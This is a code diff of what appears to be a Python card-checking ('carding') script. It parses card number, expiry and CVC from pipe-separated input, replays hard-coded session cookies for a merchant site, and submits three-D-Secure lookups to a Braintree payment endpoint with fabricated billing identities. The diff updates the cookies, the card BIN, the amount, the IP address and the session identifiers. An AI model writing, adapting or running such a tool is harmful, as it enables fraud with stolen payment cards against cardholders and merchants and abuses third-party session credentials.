@@ -4293,10 +4293,7 @@ def au(ccx):
 	cvc = ccx.split("|")[3]
 	if "20" in yy:#Mo3gza
 		yy = yy.split("20")[1]
-	lines='''Memri%7C1721817927%7Cer4O9XfdO58seH5shnwJbJrTQhyd5NDhCmfomYyOYqr%7Cb17cede3ce7a1663fe3135b2d1eb9a3d12be56cea0f70dddac1f6a8453d73ed2
-loayrn%7C1721822820%7C3dlqXGIZfLCVBZNlJCR2zK5KQTtMi5wmK6vykRxYKp9%7C89e1cc44c4b6234ff0b511f5093f6e83f2cf72a9bfe53521a673886efbd451cb
-Pfiwgfn%7C1721823167%7CkHL521ZnhDFCWLKZpRIbFfrmNmNYGjcQ0CZ1CUPqDh6%7Cbced090a59816cd26a30e01bbd00083c62f614435c789afa6cc45cc30615c69e
-mcbsot%7C1721845782%7C3hwcyRj2Ve6QzGzUfIgDRCvZI2QR4SyAko1JAeGo5Kv%7C1ab7bf3fdea413b0e7c6716791072bb81b1226ddb3405395846e87dc6be53129'''
+	lines='''mdjfjfud7379ero%40gmail.com%7C1725424450%7CLqYXNbcCErhLrqZdbmICaxU8oMOfov0PFKBGPf8XkoQ%7C104da8606bf4e3ae298a7c3266ff3dfacce2574089846817dded4ae772124135'''
 	def up(big):
 		cookies = {
 		    '_gid': 'GA1.3.1249998794.1720519619',
@@ -4448,56 +4445,49 @@ mcbsot%7C1721845782%7C3hwcyRj2Ve6QzGzUfIgDRCvZI2QR4SyAko1JAeGo5Kv%7C1ab7bf3fdea4
 	}
 	
 	json_data = {
-	    'amount': '16.13',
+    'amount': '0.00',
     'browserColorDepth': 24,
     'browserJavaEnabled': False,
     'browserJavascriptEnabled': True,
-    'browserLanguage': 'ar-EG',
+    'browserLanguage': 'ar',
     'browserScreenHeight': 800,
     'browserScreenWidth': 360,
     'browserTimeZone': -180,
     'deviceChannel': 'Browser',
     'additionalInfo': {
-        'shippingGivenName': 'Mero',
-        'shippingSurname': 'AYman',
+        'ipAddress': '197.63.41.253',
         'billingLine1': '323 E Pine St',
         'billingLine2': '',
         'billingCity': 'Deming',
         'billingState': '',
-        'billingPostalCode': 'LE17 5NY',
+        'billingPostalCode': 'TW2 7LD',
         'billingCountryCode': 'GB',
         'billingPhoneNumber': '66464649',
         'billingGivenName': 'Mero',
         'billingSurname': 'AYman',
-        'shippingLine1': '323 E Pine St',
-        'shippingLine2': '',
-        'shippingCity': 'Deming',
-        'shippingState': '',
-        'shippingPostalCode': 'LE17 5NY',
-        'shippingCountryCode': 'GB',
-        'email': 'hab959ddddddddddd@gmail.com',
+        'email': 'nacofew477@iteradev.com',
     },
-    'bin': '544548',
-    'dfReferenceId': '0_48542424-0c9c-43a5-b189-a6e3a86682be',
+    'bin': '434769',
+    'dfReferenceId': '0_3badc98d-9c3b-4202-b7b9-8b1dea848bf7',
     'clientMetadata': {
         'requestedThreeDSecureVersion': '2',
-        'sdkVersion': 'web/3.102.0',
-        'cardinalDeviceDataCollectionTimeElapsed': 7,
-        'issuerDeviceDataCollectionTimeElapsed': 9175,
+        'sdkVersion': 'web/3.106.0',
+        'cardinalDeviceDataCollectionTimeElapsed': 402,
+        'issuerDeviceDataCollectionTimeElapsed': 9434,
         'issuerDeviceDataCollectionResult': True,
     },
     'authorizationFingerprint': au,
-    'braintreeLibraryVersion': 'braintree/web/3.102.0',
+    'braintreeLibraryVersion': 'braintree/web/3.106.0',
     '_meta': {
         'merchantAppId': 'trade-chem.co.uk',
         'platform': 'web',
-        'sdkVersion': '3.102.0',
+        'sdkVersion': '3.106.0',
         'source': 'client',
         'integration': 'custom',
         'integrationType': 'custom',
-        'sessionId': 'd31537e4-507f-42eb-8026-e983a344fa81',
+        'sessionId': '522f5c93-bb3e-40ef-954d-6535bb76c94d',
     },
-	}
+}
 	
 	response = requests.post(
 	    f'https://api.braintreegateway.com/merchants/zkrjk5krj2dwnsgc/client_api/v1/payment_methods/{tok}/three_d_secure/lookup',
